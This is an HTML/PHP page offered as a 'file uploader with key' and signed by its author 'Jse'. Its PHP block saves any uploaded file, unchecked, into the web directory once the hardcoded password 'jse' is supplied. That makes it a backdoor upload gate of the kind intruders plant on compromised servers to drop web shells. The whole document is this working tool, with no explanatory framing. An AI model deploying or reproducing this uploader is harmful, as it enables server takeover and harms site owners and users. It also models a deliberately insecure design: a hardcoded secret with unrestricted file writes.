<!doctype html>
<html lang="en">
  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="canonical" href="https://getbootstrap.com/docs/4.4/examples/floating-labels/">
    <link href="https://getbootstrap.com/docs/4.4/examples/floating-labels/floating-labels.css" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <link rel="icon" type="image/png" href="https://developer.mozilla.org/static/img/opengraph-logo.72382e605ce3.png"/>
    <title>Simple File Uploader:~ With Key</title>

    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
  </head>
  <body>

    <form class="form-signin" enctype="multipart/form-data" action="" method="POST">
        <div class="text-center mb-4">
          <h1 class="h3 mb-3 font-weight-normal">One File Uploader With Key!</h1>
        </div>
        <div class="card border-info mb-3">
          <div class="card-body text-info">
            <h5 class="card-title">About this Uploader:~</h5>
            <p class="card-text">
             You can upload any files, as long as you have the <ion-icon name="key"></ion-icon> KEY to access this gate.
            </p>
          </div>
        </div>

<?PHP
##########################################################################
#     Coded by Jse
#     01-17-2020
#     at localhost
##########################################################################

        if (isset($_REQUEST['execute'])){
          if (!empty($_FILES['file']))
          {
            if ($_POST['key'] == "jse") {
             
              $path = basename( $_FILES['file']['name']);
              if (move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
                  $status = "success";
                  $msg = "The file ".  basename( $_FILES['file']['name']). " has been uploaded";
              } else {
                  $status = "warning";
                  $msg = "There was an error uploading the file, please try again!";
              }

                  if ($status == "success") {
                    echo '<div class="alert alert-'.$status.'">
                          <strong>Success!</strong> '.$msg.'.
                        </div>';
                  } else if ($status == "warning"){
                    echo '<div class="alert alert-'.$status.'">
                          <strong>Failed!</strong> '.$msg.'.
                        </div>';
                  } else{
                    echo '<div class="alert alert-primary">
                          <strong>Failed!</strong> Unknown.
                        </div>';
                  }
              }else{
                    echo '<div class="alert alert-danger">
                          <strong>Invalid Key!</strong> ^_^.
                        </div>';
            }
          }
        }
?>

        <div class="custom-file mb-3">
          <input type="file" class="custom-file-input" id="customFile" name="file" required>
          <label class="custom-file-label" for="customFile">Choose file</label>
        </div>
        <div class="form-group mb-3">
          <input type="password" id="inputPassword" name="key" class="form-control" placeholder="Key?" required>
        </div>
        <button class="btn btn-lg btn-primary btn-block" type="submit" name="execute">Execute</button>
        <p class="mt-5 mb-3 text-muted text-center">Coded by ./Jse with <ion-icon md="md-heart"></ion-icon> - &copy; <?= date('Y');?></p>
    </form>

    <script>
    $(".custom-file-input").on("change", function() {
      var fileName = $(this).val().split("\\").pop();
      $(this).siblings(".custom-file-label").addClass("selected").html(fileName);
    });
    </script>
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@4.5.10-0/dist/ionicons/ionicons.esm.js"></script>
  </body>
</html>
